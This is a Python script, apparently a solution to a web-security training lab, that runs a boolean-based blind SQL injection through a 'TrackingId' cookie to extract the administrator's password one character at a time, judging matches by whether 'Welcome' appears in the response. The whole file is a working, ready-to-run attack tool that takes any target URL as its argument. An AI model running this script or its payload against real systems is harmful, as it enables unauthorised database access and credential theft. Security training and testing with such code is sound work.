```python
import sys
import urllib.parse
import requests
import urllib3
import urllib

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define proxies for debugging (e.g., using Burp Suite)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url):
    """
    Perform a blind SQL injection attack to extract the administrator's password.

    Args:
        url (str): The target URL.

    Returns:
        None
    """
    password_extracted = ""
    
    # Loop through the maximum length of the password (20 characters in this case)
    for i in range(1, 21):
        # Iterate over printable ASCII character range (32 to 126)
        for j in range(32, 126):
            # Create the SQL injection payload to extract one character at a time
            sqli_payload = (
                "' AND (SELECT ascii(substring(password,%s,1)) FROM users WHERE username='administrator')='%s'-- x"
                % (i, j)
            )

            # URL encode the payload
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)

            # Inject the payload into the 'TrackingId' cookie
            cookie = {
                'TrackingId': 'Ht9aNG96obOW2BeN' + sqli_payload_encoded,
                'session': 'MPToV8nGp9iNjYa5cDvd4NR9CmSkHSjN'
            }

            # Send the HTTP request with the crafted cookie
            try:
                r = requests.get(url, cookies=cookie, verify=False, proxies=proxies, timeout=10)
            except requests.RequestException as e:
                print(f"[!] Request failed: {e}")
                return

            # Check if the response indicates a correct character match
            if "Welcome" not in r.text:
                # No match, continue to next character
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
            else:
                # Match found, append the character to the extracted password
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break

def main():
    """
    Main function to handle input arguments and initiate the SQL injection process.

    Returns:
        None
    """
    # Check if the user provided the target URL as an argument
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s https://www.example.com" % sys.argv[0])
        sys.exit(1)

    url = sys.argv[1]
    print("[+] Retrieving password.....")

    # Start the SQL injection password extraction
    sqli_password(url)

if __name__ == "__main__":
    main()
```